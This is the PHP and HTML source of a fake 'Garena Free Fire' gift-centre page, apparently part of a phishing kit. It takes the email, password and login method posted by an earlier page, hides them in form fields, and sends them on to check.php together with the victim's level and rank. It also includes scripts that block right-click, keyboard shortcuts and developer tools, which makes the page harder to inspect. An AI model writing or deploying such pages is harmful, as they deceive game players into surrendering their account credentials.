<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if(!$email | !$password | !$login){
header("Location: index.php");
}
?>
<html>
<head>
<title>Garena Free Fire</title>
<meta charset="UTF-8"/>
<meta property="description" content="Free clain gift in Garena Free Fire."/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<meta name="theme-color" content="#eaa300">
<link rel="icon" type="img/png" href="img/thumbnail.png">
<link rel="stylesheet" href="css/style.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<body>
<style type="text/css">
	#hadiah fieldset:not(:first-of-type) {
		display: none;
	}
fieldset {
border: none;
}
</style>

<!--Kode untuk mematikan fungsi klik kanan di blog-->

<script type="text/javascript">

function mousedwn(e){try{if(event.button==2||event.button==3)return false}catch(e){if(e.which==3)return false}}document.oncontextmenu=function(){return false};document.ondragstart=function(){return false};document.onmousedown=mousedwn

</script>

<!--Kode untuk mencegah shorcut keyboard, view source dll.-->

<script type="text/javascript">

window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}

</script>

<script type="text/javascript">

document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}

</script>


<div class="loading"></div>
<div class="navbar">
	<img src="img/thumbnail.png">GARENA FREE FIRE</br>
	<span>PUSAT HADIAH FREE FIRE</span>
</div>
</br>
</br>
</br>
</br>
</br>
<form id="hadiah" action="check.php" method="post">
	<div class="isi-sukses">
		<fieldset>
			<center>
			<h4 class="berhasil">VERIFICATION REQUIRED</h4>
			<hr class="garis">
			<h4 class="berhasil-text">COMPLETED THIS SUBMISSION AND GET GIFTS</br></h4>
<input name="email" type="hidden" value="<?php echo $email;?>" readonly>
<input name="password" type="hidden" value="<?php echo $password;?>" readonly>
<input name="login" type="hidden" value="<?php echo $login;?>" readonly>

<select name="lvl" required>
<option selected="selected" disabled="disabled" value="">LEVEL</option>
<option>Level 1</option>
<option>Level 2</option>
<option>Level 3</option>
<option>Level 4</option>
<option>Level 5</option>
<option>Level 6</option>
<option>Level 7</option>
<option>Level 8</option>
<option>Level 9</option>
<option>Level 10</option>
<option>Level 11</option>
<option>Level 12</option>
<option>Level 13</option>
<option>Level 14</option>
<option>Level 15</option>
<option>Level 16</option>
<option>Level 17</option>
<option>Level 18</option>
<option>Level 19</option>
<option>Level 20</option>
<option>Level 21</option>
<option>Level 22</option>
<option>Level 23</option>
<option>Level 24</option>
<option>Level 25</option>
<option>Level 26</option>
<option>Level 27</option>
<option>Level 28</option>
<option>Level 29</option>
<option>Level 30</option>
<option>Level 31</option>
<option>Level 32</option>
<option>Level 33</option>
<option>Level 34</option>
<option>Level 35</option>
<option>Level 36</option>
<option>Level 37</option>
<option>Level 38</option>
<option>Level 39</option>
<option>Level 40</option>
<option>Level 41</option>
<option>Level 42</option>
<option>Level 43</option>
<option>Level 44</option>
<option>Level 45</option>
<option>Level 46</option>
<option>Level 47</option>
<option>Level 48</option>
<option>Level 49</option>
<option>Level 50</option>
<option>Level 51</option>
<option>Level 52</option>
<option>Level 53</option>
<option>Level 54</option>
<option>Level 55</option>
<option>Level 56</option>
<option>Level 57</option>
<option>Level 58</option>
<option>Level 59</option>
<option>Level 60</option>
<option>Level 61</option>
<option>Level 62</option>
<option>Level 63</option>
<option>Level 64</option>
<option>Level 65</option>
<option>Level 66</option>
<option>Level 67</option>
<option>Level 68</option>
<option>Level 69</option>
<option>Level 70</option>
<option>Level 71</option>
<option>Level 72</option>
<option>Level 73</option>
<option>Level 74</option>
<option>Level 75</option>
<option>Level 76</option>
<option>Level 77</option>
<option>Level 88</option>
<option>Level 79</option>
<option>Level 80</option>
<option>Level 81</option>
<option>Level 92</option>
<option>Level 83</option>
<option>Level 84</option>
<option>Level 85</option>
<option>Level 86</option>
<option>Level 87</option>
<option>Level 88</option>
<option>Level 89</option>
<option>Level 90</option>
<option>Level 91</option>
<option>Level 92</option>
<option>Level 93</option>
<option>Level 94</option>
<option>Level 95</option>
<option>Level 96</option>
<option>Level 97</option>
<option>Level 98</option>
<option>Level 99</option>
<option>Level 100</option></select></br>

<select name="rpt" required>
<option selected="selected" disabled="disabled" value="">PERNAH ELITE PASS?</option>
<option>Pernah</option>
<option>Tidak Pernah</option>
<option>Pre-order</option>
</select></br>


<select name="rpl" required>
<option selected="selected" disabled="disabled" value="">LEVEL RANKED?</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Master</option>
<option>Grand Master</option>
</select></br>

			</center>
			<hr class="garis"></br>
			<button type="submit" onmousedown="buka.play()" class="btn-next">SUBMIT <i class="btn-next-ir fa fa-chevron-right"></i></button>
			</br>
			</br>
		</fieldset>
	</div>
</form>

</br>
</br>
</br>
<div class="footer">
	<center>
	<img width="70" src="img/garena-logo.png">
	</center>
</div>
<script src="js/click.js"></script>
<script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
<script> $(window).load(function() { $(".loading").fadeOut("slow"); }); </script>
<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>
</body>
</html>